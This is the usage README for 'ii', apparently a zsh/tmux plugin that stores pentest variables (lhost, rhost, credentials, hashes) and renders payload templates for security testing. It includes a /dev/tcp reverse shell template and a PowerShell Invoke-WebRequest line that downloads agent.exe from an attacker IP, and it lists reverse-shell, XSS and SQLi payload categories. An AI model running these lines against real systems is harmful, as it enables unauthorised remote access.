# Usage

`ii` stores workflow variables in the current tmux session using the internal
`ii_` namespace. User-facing commands use names without that prefix.

## State Model

```text
tmux session environment = shared source across panes
current shell environment = values directly usable in the current pane
payload file renderer = always reads fresh tmux session values
payload input renderer = reads current shell first, then tmux session values
```

`ii s` writes to tmux and exports the value into the current shell. `ii l` loads
tmux values into the current shell later. `ii p` renders from tmux directly, so
another pane can render payload files without running `ii l`. `ii p --input`
is different: it starts with shell variables visible in the current command
context, then falls back to tmux.

## Commands

| Command | Short form | Purpose |
| --- | --- | --- |
| `ii set NAME VALUE` | `ii s NAME VALUE` | Set internal `ii_name` in tmux and export the configured shell name in this shell |
| `ii set -d [INTERFACE]` | `ii s -d`, `ii s:lhost -d [INTERFACE]` | Detect lhost from an interface, defaulting to `tun0` |
| `ii set` | `ii s` | Open a TUI to choose common variable names and type a value |
| `ii set FILTER` | `ii s FILTER`, `ii s:FILTER` | Match variable names before setting; `ii s r` jumps to `RHOST` |
| `ii get FILTER` | `ii g FILTER`, `ii g:FILTER` | Copy and print one tmux variable value without loading |
| `ii load` | `ii l` | Load tmux variables into this shell without the internal `ii_` prefix |
| `ii clip backend` | | Show or set clipboard backend |
| `ii clip doctor` | | Diagnose clipboard behavior and suggest a backend |
| `ii interactive` | `ii i` | Select variable names with fzf, preview values, edit, delete, add, and copy values |
| `ii ls [PATTERN]` | | List non-empty tmux variables as key/value blocks, optionally filtered by key |
| `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, copy, and print a payload |
| `ii unset NAME [...]` | `ii u NAME [...]` | Remove `ii_` variables from tmux and this shell |
| `ii unset -a` | `ii u -a` | Prompt, then remove all `ii_` variables from the current tmux session |
| `ii help [COMMAND]` | `ii h [COMMAND]` | Show help |

## Basic Workflow

Run inside tmux:

```zsh
ii s
ii s lhost 192.168.45.192
ii s lport 443
ii s domain example.test
ii s user alice
ii s passwd secret

ii ls
ii ls host
ii ls user
ii p linux
```

`ii_` is only an internal tmux namespace. User input is normalized to lowercase,
so `user2` and `USER2` refer to the same tmux variable, `ii_user2`. Shell
exports use names without the prefix. By default, `ii set` and `ii load` export
lowercase shell names such as `$lhost` and `$domain`.

Set `II_EXPORT_CASE` to change shell export behavior:

```zsh
export II_EXPORT_CASE=lower  # default: lhost
export II_EXPORT_CASE=upper  # LHOST
export II_EXPORT_CASE=both   # lhost and LHOST
```

## Configuration

`ii` reads this config file automatically when it exists:

```text
~/.config/ii/ii.conf
```

Use it for stable preferences such as shell export case:

```zsh
export II_EXPORT_CASE=lower
```

To use a different config path, set `II_CONFIG_FILE` in `.zshrc` before loading
the plugin:

```zsh
export II_CONFIG_FILE="$HOME/.config/ii/work.conf"
source "$HOME/.config/zsh/plugin/ii/ii.plugin.zsh"
```

See [doc/conf/ii.conf](conf/ii.conf) for a complete example.

## Variables

Default names that have not been assigned values are not exported into the
shell.

Default variable names:

```text
domain
lhost
rhost
lport
rport
user
passwd
user1
passwd1
hash1
user2
passwd2
hash2
```

`ii s FILTER` resolves matches before asking for a value:

- No matches prints `no matched`.
- One match goes straight to the value prompt.
- Multiple matches open a variable selection prompt.

`ii g FILTER` uses the same case-insensitive name matching and shortcuts as
`ii s FILTER`. It copies the selected value through the clipboard layer and
prints it, but it does not modify variables or load values into the shell.
Multiple matches open a prompt; Enter or Space selects and copies one value,
while `q`, Esc, or Ctrl-C aborts without changing variables or copying anything.

`ii ls PATTERN` filters by key name, case-insensitively:

```zsh
ii ls host
ii ls user
ii ls l
```

### Variable Output

`ii ls` prints only non-empty tmux variables. Empty default names are hidden, so
the list stays focused on values that are actually set.

Each variable is printed as a compact two-line block:

```text
lhost
192.168.45.192
lport
443
```

In an interactive terminal, the key line is blue and the value line uses normal
text. Entries are not separated by blank lines. This keeps copy-mode scanning
dense while still making variable names visually distinct from values.

`ii ls PATTERN` uses the same output format after filtering by key name.

## Interactive Variables

`ii i` shows common variable names even when they do not have values yet. The
fzf list shows names with a one-line value preview. Variables with values are
listed before empty default names, so the cursor starts near active entries.
The selected value appears in a compact bottom preview.

Keys:

| Key | Action |
| --- | --- |
| `Enter` | Edit the selected variable |
| `Ctrl-S` | Add a variable immediately |
| `Ctrl-X` | Delete the selected variable |
| `Ctrl-Y` | Copy selected existing values |
| `Tab` | Mark multiple values for copy |
| `Esc` / `Ctrl-C` | Abort |

Aborting while editing preserves the original value. A value is replaced only
after confirming with Enter. Clearing a value and confirming stores an empty
value.

`ii i` does not load variables into the shell. Use `ii l` to load all non-empty
variables into the current shell.

## Payloads

### Payload Files

Payload files are plain text templates under `II_PAYLOAD_DIR`.

Example:

```text
payloads/
  shell/
    linux/
      sh-tcp
      bash-tcp
      nc-mkfifo
    windows/
      powershell-rev
  script/
    config/
      hosts
    tool/
      ii/
        detect-lhost
      nmap/
        nmap
  xss/
    basic-alert
```

Use `${II_NAME}` placeholders:

```text
/bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
```

Files under `payloads/script/` are for custom scripts. They may use
`${II_NAME}` placeholders, or they may use literal shell variables such as
`$rhost`. When no renderable `${II_*}` placeholder is present, `ii p` copies the
script text as-is.

Payload files use a small plain-text schema:

```text
# description: optional operator-facing description
payload body with ${II_NAME} placeholders or literal lowercase shell variables
```

For documentation and tooling, the logical payload object includes `$schema`,
`path`, `description`, `body`, and `variables`. See
[payload-schema.md](payload-schema.md).

If a payload variable has not been assigned a non-empty tmux value, `ii p`
renders a lowercase shell fallback such as `$rhost` so the copied command can
still be expanded by the shell that runs it.

The payload selector shows a one-line rendered preview in the list. The selected
payload preview reserves separate description and keys blocks around the body.
A first-line `# description: ...` metadata line is shown in preview but omitted
from copied output.

Write the rendered payload to a file with `-o`:

```zsh
ii p linux -o
ii p linux -o filename
ii p linux -o ./
ii p linux -o ./payload.txt
ii p linux -o /tmp/payload.txt
```

`-o` keeps the normal terminal output. With no path, it writes
`/www/p/att.txt`. A bare filename writes under `/www`, so `-o filename` writes
`/www/filename`. Directory paths use `att.txt`, so `-o ./` writes
`./att.txt`. After the rendered output and variable report, `ii` prints an
output note and then ends with the full output path on its own line.

### Pasted Input Rendering

Render pasted input without adding a payload file:

```zsh
ii p --input
ii p --input --copy
ii p --input -o
ii p --input -o ./payload.txt
```

`ii p --input` reads until `.` is entered on its own line. It renders lowercase
shell-style variables such as `$lhost`, `${file}`, and `${file:t}`. Current
shell variables win; if the exact lowercase shell variable does not exist, ii
falls back to the tmux session value. Missing variables render as empty and are
reported in red. Shell-sourced variables are reported in blue.

Uppercase variables are left unchanged. PowerShell scope variables such as
`$env:`, `$script:`, `$global:`, `$local:`, and `$private:` are also left
unchanged. The terminal output starts with a separator for tmux copy-mode, but
`--copy` copies only the rendered body.

`-o` writes the rendered body to a file while keeping the normal terminal
output. It follows the same path rules as payload file output, including the
final full-path line.

Use a single `:q` or `:q!` line to cancel pasted input without rendering or
copying anything.

Use inline assignments for one-command shell overrides:

```zsh
lhost=10.10.14.3 file=/tmp/drop/agent.exe ii p --input --copy
```

This matters after `ii s` or `ii l`, because loaded-variable prompt sync can
refresh same-name shell variables from tmux before the next command prompt.

Example input:

```text
$KALI = "$lhost"
$FILE = "${file:t}"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
.
```

With `lhost=10.10.14.3` and `file=/tmp/drop/agent.exe`, the rendered body is:

```text
$KALI = "10.10.14.3"
$FILE = "agent.exe"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
```

### Payload Categories

Filter payloads by category:

```zsh
ii p
ii p shell
ii p script
ii p linux
ii p windows
ii p xss
ii p sqli
```

## Payload Directory

By default, the plugin points `II_PAYLOAD_DIR` to the bundled payload directory:

```text
${II_PLUGIN_DIR}/payloads
```

Override it only if you keep payloads somewhere else:

```zsh
export II_PAYLOAD_DIR="$HOME/.config/ii/payloads"
```
